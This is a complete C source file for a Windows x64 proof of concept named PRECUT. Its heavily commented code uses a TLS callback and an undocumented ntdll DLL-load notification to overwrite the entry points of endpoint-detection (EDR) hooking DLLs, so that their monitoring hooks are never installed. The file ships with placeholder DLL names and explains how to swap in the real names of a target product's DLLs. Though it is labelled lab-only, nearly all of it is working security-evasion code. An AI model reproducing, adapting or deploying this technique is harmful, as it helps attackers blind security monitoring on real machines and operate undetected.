/*
 * ========================================================================
 *  PRECUT  --  TLS callback entry-point stubbing PoC
 * ========================================================================
 *
 * Minimal proof-of-concept: no console output, no marks, no report.
 * Two functions and one fact of loader timing:
 *
 *   tls_callback   runs inside LdrpInitializeProcess, BEFORE the loader
 *                  calls NtTestAlert. At this point, EDR user-mode hooking
 *                  DLLs delivered via queued APCs are not yet mapped --
 *                  their delivery APC still waits behind that call. The
 *                  callback stubs anything already mapped (Write A,
 *                  normally zero hits) and registers a load notification.
 *
 *   on_dll_loaded  fires for every later DLL map, after the map and
 *                  BEFORE the loader calls the DLL's entry point. For a
 *                  matching image it overwrites AddressOfEntryPoint with
 *
 *                      B8 01 00 00 00 C3     mov eax, 1 ; ret
 *
 *                  The loader then calls the entry it was always going
 *                  to call; it returns 1 immediately. Real DllMain never
 *                  runs, the hooking routines are never planted, and no
 *                  inline hook (E9) lands in ntdll / KERNELBASE.
 *                  The images stay mapped.
 *
 * Why this timing window exists
 * -----------------------------
 * During process creation the kernel queues an APC to the initial thread
 * that will eventually map the EDR's user-mode DLLs. The user-mode loader
 * (ntdll!LdrpInitializeProcess) runs first:
 *
 *   1. Loader processes the PE's TLS directory  --> tls_callback runs HERE
 *   2. Loader calls NtTestAlert                 --> drains the APC queue
 *   3. APC handler maps the EDR hooking DLLs
 *   4. Loader calls DllMain on each new image   --> hooks are installed
 *
 * Because TLS callbacks (step 1) execute before NtTestAlert (step 2), the
 * EDR images do not yet exist in the address space when our code runs. We
 * cannot stub them yet, but we CAN register a DLL load notification. When
 * the loader later maps each EDR DLL (step 3), it fires our notification
 * BEFORE calling DllMain (step 4) -- and that is where we write the stub.
 *
 * Verification on a lab VM: read ntdll!NtProtectVirtualMemory before and
 * after -- a clean stub keeps 4C 8B D1 B8 (byte +3 never replaced).
 *
 * main returns immediately. If you want the process to stay alive for
 * WinDbg inspection, add a Sleep or a MessageBox there yourself.
 *
 * Build: open PrecutCore.sln (VS2022, v143) and build Release|x64, or
 * build with MSBuild. /MT and /INCLUDE:_tls_used are set in the project
 * and forced from this file as well. x64 only.
 *
 * NOTE: This PoC ships with placeholder DLL names that match nothing on
 * a live system. Edit is_hooking_dll() before building:
 *   - prefix_dll() for versioned DLLs (suffix changes per agent update)
 *   - wicmp()      for fixed-name DLLs (same filename across versions)
 * See the comment block above is_hooking_dll() for guidance on choosing
 * between prefix and exact matching. The technique itself is generic --
 * any EDR that delivers its user-mode hooks via APC after EXE TLS has
 * the same window.
 *
 * Lab use only. Not production.
 */

/* Strip rarely-used headers to speed up compilation */
#define WIN32_LEAN_AND_MEAN
#include <windows.h>
#include <winternl.h>

/* Hard-stop on 32-bit builds -- all offsets and the gs:[0x60] PEB read
 * below are x64-specific */
#ifndef _WIN64
#error x64 only.
#endif

/* ========================================================================
 *  Loader notification types (ntdll, not in the SDK headers)
 * ========================================================================
 * LdrRegisterDllNotification stores a function pointer; the loader then
 * calls it on every DLL map. Reason LOADED arrives after the image is
 * mapped and before LdrpCallInitRoutine calls its DllMain -- the gap this
 * PoC lives in. The structs below are undocumented ntdll internals: they
 * do not appear in any Windows SDK header but have been stable across
 * Windows 10 and 11 (verified through 10.0.26100). We declare them here
 * so the code compiles without an ntdll import library or a DDK.
 */

/* Layout of the notification payload for a freshly mapped DLL.
 * The loader fills this in and passes a pointer to every registered
 * notification callback. */
typedef struct _LDR_DLL_LOADED_NOTIFICATION_DATA {
    ULONG           Flags;          /* reserved, always 0 in practice    */
    PUNICODE_STRING FullDllName;    /* full NT path, e.g. \??\C:\...     */
    PUNICODE_STRING BaseDllName;    /* file basename only, e.g. foo.dll  */
    PVOID           DllBase;        /* load address of the mapped image  */
    ULONG           SizeOfImage;    /* virtual size of the mapped image  */
} LDR_DLL_LOADED_NOTIFICATION_DATA;

/* Union wrapper -- the loader can theoretically send UNLOADED payloads
 * too (same layout), but only LOADED matters here. */
typedef union _LDR_DLL_NOTIFICATION_DATA {
    LDR_DLL_LOADED_NOTIFICATION_DATA Loaded;
} LDR_DLL_NOTIFICATION_DATA, *PLDR_DLL_NOTIFICATION_DATA;

/* Notification reason code: 1 = a DLL was just mapped into the process */
#define LDR_DLL_NOTIFICATION_REASON_LOADED 1

/* Signature the loader expects our callback to have */
typedef VOID (CALLBACK *PLDR_DLL_NOTIFICATION_FUNCTION)(
    ULONG                      NotificationReason,
    PLDR_DLL_NOTIFICATION_DATA NotificationData,
    PVOID                      Context);

/* Signature of the undocumented ntdll export that registers our callback.
 * Resolved at runtime via GetProcAddress since there is no import lib. */
typedef NTSTATUS (NTAPI *fnLdrRegisterDllNotification)(
    ULONG                          Flags,
    PLDR_DLL_NOTIFICATION_FUNCTION NotificationFunction,
    PVOID                          Context,
    PVOID                         *Cookie);

/* One loader-list entry (LDR_DATA_TABLE_ENTRY), hand-declared. The PEB
 * exposes PEB_LDR_DATA which owns three doubly-linked lists of these
 * records (load order, memory order, init order). peb_stub_loaded()
 * walks InMemoryOrderLinks. On x64 the PEB address lives at gs:[0x60]
 * (the TEB's ProcessEnvironmentBlock field). */
typedef struct _PC_LDR {
    LIST_ENTRY     InLoadOrderLinks;            /* links, load order     */
    LIST_ENTRY     InMemoryOrderLinks;          /* links, memory order   */
    LIST_ENTRY     InInitializationOrderLinks;  /* links, init order     */
    PVOID          DllBase;                     /* module base address   */
    PVOID          EntryPoint;                  /* module entry point    */
    ULONG          SizeOfImage;                 /* virtual image size    */
    UNICODE_STRING FullDllName;                 /* full path             */
    UNICODE_STRING BaseDllName;                 /* basename for matching */
} PC_LDR;

/* Forward declaration -- registered with the loader in arm_notification() */
static VOID CALLBACK on_dll_loaded(
    ULONG reason, PLDR_DLL_NOTIFICATION_DATA data, PVOID ctx);

/* ========================================================================
 *  Name matching
 * ========================================================================
 * Loader names arrive as length-counted UNICODE_STRING with arbitrary
 * case. copy_uname normalises to a bounded C string; the matchers fold
 * ASCII case and (for prefix_dll) require a real ".dll" suffix so a
 * prefix like "edr_hook" cannot accidentally hit a config file named
 * "edr_hook.cfg" or a directory entry with no extension.
 */

/* fold -- ASCII lowercase a single wide character.
 * Non-ASCII characters pass through untouched; only A-Z is collapsed. */
static wchar_t fold(wchar_t c)
{
    return (c >= L'A' && c <= L'Z') ? (wchar_t)(c + 32) : c;
}

/* copy_uname -- convert a length-counted UNICODE_STRING into a
 * null-terminated wide C string, clamped to the destination capacity.
 * Returns the number of characters copied, or 0 on any bad input.
 * Note: UNICODE_STRING.Length is in BYTES, not characters -- the
 * division by sizeof(wchar_t) converts to char count. */
static int copy_uname(const UNICODE_STRING *u, wchar_t *out, int cap)
{
    int n, i;
    if (!u || !u->Buffer || u->Length == 0 || cap < 2) return 0;
    n = (int)(u->Length / sizeof(wchar_t));  /* bytes -> characters */
    if (n >= cap) n = cap - 1;
    for (i = 0; i < n; i++) out[i] = u->Buffer[i];
    out[n] = 0;
    return n;
}

/* prefix_dll -- true if `name` starts with `prefix` (case-folded) AND
 * ends with a literal ".dll" suffix. The suffix guard prevents prefix
 * hits on non-DLL basenames like "edr_hook.cfg" or "edr_hook_helper.sys".
 * Case is folded on both sides so "EDR_Hook12345.DLL" matches "edr_hook". */
static int prefix_dll(const wchar_t *name, const wchar_t *prefix)
{
    int i = 0, n = 0;
    if (!name || !prefix) return 0;
    while (prefix[i]) {
        if (fold(name[i]) != fold(prefix[i])) return 0;
        i++;
    }
    if (!name[i]) return 0;      /* prefix consumed the entire name */
    while (name[n]) n++;
    if (n < 4) return 0;         /* too short to hold ".dll" */
    return fold(name[n-4]) == L'.' && fold(name[n-3]) == L'd'
        && fold(name[n-2]) == L'l' && fold(name[n-1]) == L'l';
}

/* wicmp -- case-insensitive wide string compare (folded ASCII only).
 * Same contract as _wcsicmp: returns 0 when equal. */
static int wicmp(const wchar_t *a, const wchar_t *b)
{
    while (*a && *b) {
        wchar_t la = fold(*a), lb = fold(*b);
        if (la != lb) return (int)(la - lb);
        a++; b++;
    }
    return (int)(fold(*a) - fold(*b));
}

/*
 * ========================================================================
 *  TARGET DLL MATCHING
 * ========================================================================
 *
 * Replace the placeholders below with the actual DLL basenames from the
 * EDR product you are analyzing in your lab. Use a debugger breakpoint
 * on ntdll!LdrLoadDll or ntdll!LdrpSendDllNotifications to identify
 * every image the loader maps at startup.
 *
 * Two match strategies:
 *
 *   prefix_dll(name, L"hookeng")
 *       Use when the DLL name includes a version number, build hash, or
 *       other suffix that changes across agent updates. Give only the
 *       stable leading part. The function checks that the name starts
 *       with the prefix (case-insensitive) AND ends with ".dll", so
 *       "hookeng.dll", "hookeng8542.dll", "hookeng_v3.dll" all match
 *       but "hookeng.cfg" does not.
 *
 *   wicmp(name, L"agentclient64.dll") == 0
 *       Use when the DLL name is always exactly the same across
 *       versions. Full case-insensitive comparison — only the exact
 *       basename matches. Safer than prefix when the name is generic
 *       enough that a prefix could collide with unrelated modules.
 *
 * You can use prefix_dll for everything if the prefix is specific enough
 * to never collide with non-target DLLs. wicmp exists for cases where
 * you want zero ambiguity. Stubbing the wrong module crashes the process.
 *
 * Add or remove entries to match what your target EDR injects — there is
 * no fixed number of entries required.
 */
static int is_hooking_dll(const wchar_t *basename)
{
    /* ---- Versioned DLLs: use prefix_dll with the stable leading part -- */
    /* The suffix (build number, hash, etc.) changes per agent version.
     * Example: "edr_hook8542.dll", "edr_hook9100.dll" → prefix "edr_hook" */
    if (prefix_dll(basename, L"edr_hook"))     return 1;
    if (prefix_dll(basename, L"edr_dev"))      return 1;

    /* ---- Fixed-name DLLs: use wicmp for an exact basename match ------- */
    /* The full filename never changes across versions.
     * Example: "edrclient64.dll" is always "edrclient64.dll" */
    if (wicmp(basename, L"edrclient64.dll") == 0) return 1;
    if (wicmp(basename, L"edrclient.dll") == 0)   return 1;

    return 0;
}

/* ========================================================================
 *  The write
 * ========================================================================
 * stub_entry overwrites AddressOfEntryPoint of a freshly mapped image
 * with "B8 01 00 00 00 C3" (mov eax, 1 ; ret).
 *
 * Why mov eax, 1?  The DllMain contract says: return nonzero for success.
 * The loader calls the entry point expecting TRUE/FALSE; our stub returns
 * 1 (TRUE) so the loader considers the DLL loaded and moves on -- but the
 * real initialisation code (the one that plants inline hooks) never ran.
 *
 * Header walk: DllBase → MZ signature → e_lfanew offset → PE signature →
 * OptionalHeader.AddressOfEntryPoint (RVA) → add to base = absolute VA.
 * Both signatures are checked and the RVA must fit inside SizeOfImage.
 *
 * An entry that already holds the stub is left alone (idempotency), which
 * also makes repeat notifications for the same image harmless. The page
 * is flipped to PAGE_EXECUTE_READWRITE for the six-byte write because
 * entry-point pages are normally PAGE_EXECUTE_READ; the original
 * protection is restored immediately afterwards. ntdll is never touched.
 */
static void stub_entry(PVOID dll_base)
{
    BYTE *base = (BYTE *)dll_base;
    IMAGE_DOS_HEADER *dos;
    IMAGE_NT_HEADERS *nt;
    DWORD ep_rva, old;
    BYTE *ep;
    /* mov eax, 1 ; ret -- DllMain contract: nonzero means "load OK" */
    static const BYTE stub[6] = { 0xB8, 0x01, 0x00, 0x00, 0x00, 0xC3 };

    if (!base) return;                                /* null module        */
    dos = (IMAGE_DOS_HEADER *)base;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) return;  /* "MZ" check        */
    nt = (IMAGE_NT_HEADERS *)(base + dos->e_lfanew);  /* hop to PE hdr     */
    if (nt->Signature != IMAGE_NT_SIGNATURE) return;  /* "PE\0\0" check    */

    ep_rva = nt->OptionalHeader.AddressOfEntryPoint;
    /* Reject a missing entry or one whose 6 bytes would run past the
     * end of the mapped image */
    if (!ep_rva || (SIZE_T)ep_rva + 6 > nt->OptionalHeader.SizeOfImage)
        return;
    ep = base + ep_rva;                       /* RVA -> absolute address   */

    /* Idempotency: if the stub is already there, do nothing. Prevents
     * double-writing and makes repeat notifications a safe no-op. */
    if (ep[0] == 0xB8 && ep[1] == 0x01 && ep[2] == 0x00 &&
        ep[3] == 0x00 && ep[4] == 0x00 && ep[5] == 0xC3)
        return;

    /* Entry-point pages are normally PAGE_EXECUTE_READ -- temporarily
     * make them writable. On failure, give up silently. */
    if (!VirtualProtect(ep, sizeof(stub), PAGE_EXECUTE_READWRITE, &old))
        return;
    CopyMemory(ep, stub, sizeof(stub));       /* the actual 6-byte write   */
    VirtualProtect(ep, sizeof(stub), old, &old);  /* restore original prot */
}

/* Write A: stub every matching image that is ALREADY mapped when our TLS
 * callback runs. On a normal start with APC-delivered hooks, the loader
 * list holds only ntdll, kernel32, and a handful of system DLLs -- none
 * of the EDR hooking modules, because those arrive via the APC that
 * NtTestAlert has not yet drained. Write A is therefore the safety net,
 * not the primary method: it covers EDR products that map their client
 * DLL BEFORE EXE TLS (e.g. via a synchronous image-load kernel callback
 * that completes before user-mode init). */
static void peb_stub_loaded(void)
{
    /* Read the PEB directly from the x64 TEB: gs:[0x60] */
    PPEB peb = (PPEB)__readgsqword(0x60);
    LIST_ENTRY *head, *cur;
    if (!peb || !peb->Ldr) return;
    /* Anchor on the InMemoryOrder module list */
    head = &peb->Ldr->InMemoryOrderModuleList;
    /* Walk Flink until we wrap back to the head sentinel */
    for (cur = head->Flink; cur != head; cur = cur->Flink) {
        /* Recover the enclosing module record from its link member */
        PC_LDR *mod = CONTAINING_RECORD(cur, PC_LDR, InMemoryOrderLinks);
        wchar_t name[256];
        if (!copy_uname(&mod->BaseDllName, name, 256)) continue;
        if (is_hooking_dll(name) && mod->DllBase)
            stub_entry(mod->DllBase);
    }
}

/* Write B -- THIS IS THE PRIMARY METHOD.
 *
 * Call sequence inside the loader for each DLL mapped after NtTestAlert:
 *
 *   LdrpMapDllNtFileName        image mapped into address space
 *   LdrpSendDllNotifications    our on_dll_loaded fires HERE
 *      --> we overwrite AddressOfEntryPoint with the stub
 *   LdrpCallInitRoutine         loader calls the entry it was always
 *                               going to call -- it now hits our stub,
 *                               returns 1, and the real DllMain (the
 *                               one that installs inline hooks) never
 *                               executes.
 *
 * The image stays mapped and listed in the PEB -- nothing is unloaded.
 * The hooking DLL simply never initialised, so its writers / ordinals
 * never ran and no E9 trampolines land in ntdll or KERNELBASE. */
static VOID CALLBACK on_dll_loaded(
    ULONG reason, PLDR_DLL_NOTIFICATION_DATA data, PVOID ctx)
{
    wchar_t name[256];
    (void)ctx;                                       /* unused context    */
    /* Only care about maps, not unloads */
    if (reason != LDR_DLL_NOTIFICATION_REASON_LOADED) return;
    if (!data || !data->Loaded.BaseDllName) return;
    if (!copy_uname(data->Loaded.BaseDllName, name, 256)) return;
    if (!is_hooking_dll(name)) return;
    /* Overwrite the entry point BEFORE the loader calls DllMain */
    stub_entry(data->Loaded.DllBase);
}

/* arm_notification -- resolve the undocumented ntdll export
 * LdrRegisterDllNotification at runtime and store on_dll_loaded as our
 * callback. This call writes zero entry-point bytes itself; it only
 * tells the loader "call me when you map any DLL from now on".
 * Registration is not retrospective: an image already mapped before this
 * call is never reported again, which is why Write A (the PEB walk)
 * exists as a separate pass. */
static void arm_notification(void)
{
    HMODULE ntdll;
    fnLdrRegisterDllNotification p_reg;
    PVOID cookie = NULL;                  /* registration handle, unused  */

    /* ntdll is guaranteed mapped at this point */
    ntdll = GetModuleHandleW(L"ntdll.dll");
    if (!ntdll) return;
    /* Resolve by name -- no import library exists for this export */
    p_reg = (fnLdrRegisterDllNotification)GetProcAddress(
        ntdll, "LdrRegisterDllNotification");
    if (!p_reg) return;
    /* Flags=0, no context; cookie receives an opaque handle we discard */
    p_reg(0, on_dll_loaded, NULL, &cookie);
}

/* ========================================================================
 *  TLS callback and plumbing
 * ========================================================================
 * The loader calls tls_callback during LdrpInitializeProcess because the
 * PE's TLS directory names it. Three pieces cooperate to make the TLS
 * directory exist and contain our function pointer:
 *
 *   1. .CRT$XLB section contribution   Our callback pointer is placed in
 *      .CRT$XLB, which the MSVC CRT collects into the TLS callback array
 *      (the "XL" family: XLA is the start sentinel, XLZ the end).
 *
 *   2. /INCLUDE:_tls_used               Forces the linker to keep the
 *      _tls_used symbol (the CRT's TLS directory template), even though
 *      nothing imports it by name. Without this the linker may dead-strip
 *      the entire TLS directory and our callback never fires.
 *
 *   3. __declspec(thread) sentinel      A live thread-local variable
 *      keeps the whole TLS apparatus from being optimised away. The
 *      compiler sees TLS data is in use and preserves the directory.
 *
 * IMPORTANT: Inside the TLS callback the CRT is NOT initialised yet.
 * No printf, no stdio, no CRT heap. Kernel32 calls (GetModuleHandleW,
 * GetProcAddress, VirtualProtect, CopyMemory) are safe because kernel32
 * is mapped and initialised before any EXE code runs. */

/* tls_callback -- the process's TLS initialiser, invoked by the loader
 * BEFORE main() and BEFORE the APC delivery that maps the EDR DLLs.
 * This early slot is the entire timing advantage of the technique. */
static void NTAPI tls_callback(PVOID h, DWORD reason, PVOID r)
{
    (void)h; (void)r;                    /* instance + reserved unused    */
    /* Only act on process attach; ignore thread attach/detach */
    if (reason != DLL_PROCESS_ATTACH) return;
    peb_stub_loaded();    /* Write A: catch anything already mapped       */
    arm_notification();   /* arm Write B: catch everything mapped later   */
}

#ifdef _MSC_VER
/* Force the linker to emit the TLS directory */
#pragma comment(linker, "/INCLUDE:_tls_used")
/* Declare the CRT callback-collection section (XLB = TLS callbacks) */
#pragma section(".CRT$XLB", long, read)
/* Drop our callback pointer into .CRT$XLB so the loader calls it */
__declspec(allocate(".CRT$XLB")) PIMAGE_TLS_CALLBACK g_tls_cb = tls_callback;
/* A live __declspec(thread) variable keeps TLS from being optimised away */
__declspec(thread) static volatile int g_tls_sentinel = 0;
#else
#error Build with MSVC /MT so the PE has a TLS directory.
#endif

/* The method is finished before main runs; main is only the container.
 * To hold the process open for WinDbg, add Sleep(INFINITE) here. */
int main(void)
{
    (void)g_tls_sentinel;  /* touch it so the compiler keeps TLS alive   */
    return 0;
}
